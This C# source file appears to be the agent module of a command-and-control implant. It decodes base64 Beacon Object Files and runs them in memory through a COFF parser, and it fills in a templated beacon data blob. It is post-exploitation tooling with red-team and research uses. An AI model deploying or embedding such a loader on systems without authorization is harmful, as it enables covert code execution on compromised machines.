using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;

namespace COFFLoader
{
    public class Agent
    {
        private const string COMMAND_COFF = "COFF";
		private static string beaconOutputData;
		private static int beaconOutputData_sz = 0;

        public static string RunCoff( byte[] Arguments )
        {
            string Result = "";

            try
            {
                Debug.WriteLine("Agent.RunCoff()");

                //Init stuff
                // args = "overwrite_bool filename b64_file"
                string t_args  = Encoding.Default.GetString(Arguments);

                string[] args = t_args.Split( new char[]
                {
                    ' '
                });

                byte[] functionname = Encoding.ASCII.GetBytes(args[0]);
                byte[] coff_data = Decode( args[1] );
				string tmp_arg_data = unhexlify(Encoding.Default.GetString(Decode( args[2] )));
                byte[] arg_data = Encoding.Default.GetBytes( tmp_arg_data);
	 			byte[] beacon_data = Decode( "{{BEACON_DATA}}");


				byte[] empty = new byte[] {};
                if (CoffParser.parseCOFF( empty, beacon_data, beacon_data.Length, null, 0) == 1)
				{ 
					Result = "Beacon Processing";
				}

				Debug.WriteLine("************************ BEACON PROCESSING DONE ***********************");

                if (CoffParser.parseCOFF( functionname, coff_data, coff_data.Length, arg_data, arg_data.Length ) == 1)
				{ 
					Result = "ERROR";
					beaconOutputData_sz = 0;
					beaconOutputData = 	"hello";
				}else
				{
					beaconOutputData_sz = 0;
					beaconOutputData = 	CoffParser.getBeaconOutputData();
				}
            }
            catch (Exception e)
            {
                Debug.WriteLine(String.Format("Exception: '{0}'", e));
            }

            return Result;
        }
		public static int BeaconGetOutputData_Size()
		{
			return beaconOutputData_sz;	
		}
		public static string BeaconGetOutputData()
		{
			return beaconOutputData;	
		}

		public static string unhexlify(string hex)
		{
			string ret = null;
			for( int i = 0; i < hex.Length-1; i+=2)
			{
				int value = Convert.ToInt32(hex.Substring(i,2),16);
				ret += Char.ConvertFromUtf32(value);
			}
			return ret;
		}
        public static byte[] Decode(string encodedBuffer)
        {
            byte[] plaintextBuffer = { };

            plaintextBuffer = System.Convert.FromBase64String(encodedBuffer);

            return plaintextBuffer;
        }
#if DEBUG_MAIN
		static void Main(string[] args)
		{
			TextWriterTraceListener myWriter = new TextWriterTraceListener(System.Console.Out);
			Debug.Listeners.Add(myWriter);
			// Display the number of command line arguments.
			Debug.WriteLine("CS_COFFLoader main function Debug");
			if (args.Length != 2) 
			{
				Console.WriteLine("USAGE: coffloader.exe <bof filename> <arguments>");
				return;
			}
			byte[] rawcoff = File.ReadAllBytes(args[0]);
			string coff = System.Convert.ToBase64String(rawcoff);
			string arguments = System.Convert.ToBase64String(Encoding.Default.GetBytes(args[1]));
			RunCoff(Encoding.Default.GetBytes(String.Format("go {0} {1}", coff, arguments)));

			string output = BeaconGetOutputData();
			int output_sz = BeaconGetOutputData_Size();
			Console.WriteLine("Output size of {0}: See below\n",output_sz);
			Console.WriteLine(output);
		}
#endif
	}
}
